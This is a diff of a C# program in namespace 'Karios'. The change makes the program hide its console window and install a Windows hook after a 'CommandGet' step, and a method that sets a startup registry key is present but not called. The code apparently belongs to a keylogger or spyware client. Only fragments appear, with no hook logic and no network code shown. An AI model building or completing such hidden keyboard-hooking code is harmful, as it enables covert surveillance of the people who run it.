@@ -31,9 +31,7 @@ namespace Karios
 
         public static void Main()
         {
-            //var handle = GetConsoleWindow();
-            //ShowWindow(handle, SW_HIDE);
-            //_hookID = SetHook(_proc);
+            
             Console.WriteLine("Starting commandget");
             Console.ReadKey();
             CommandGet();
@@ -49,9 +47,11 @@ namespace Karios
                 // Run on startup 
                 // SetStartup();
                 // Start Application
-
-                RunApplication();
-                //UnhookWindowsHookEx(_hookID);
+                var handle = GetConsoleWindow();
+                ShowWindow(handle, SW_HIDE);
+                _hookID = SetHook(_proc);
+                Application.Run();
+                UnhookWindowsHookEx(_hookID);
             }
             Console.WriteLine("IF Statement did not work... exiting");
             Console.ReadKey();
@@ -71,7 +71,7 @@ namespace Karios
             // SetStartup();
             // Start Application
             
-            Application.Run();
+            //Application.Run();
             //UnhookWindowsHookEx(_hookID);
         }
 
@@ -206,7 +206,7 @@ namespace Karios
                             //Online = false;
                         }
                         Loop = false;
-                    }
+                    }   
                 }
             }
             catch { }
@@ -295,7 +295,6 @@ namespace Karios
         /// <summary>
         /// Sets the startup registary key
         /// </summary>
-        /// 
 
         
         public static void SetStartup()
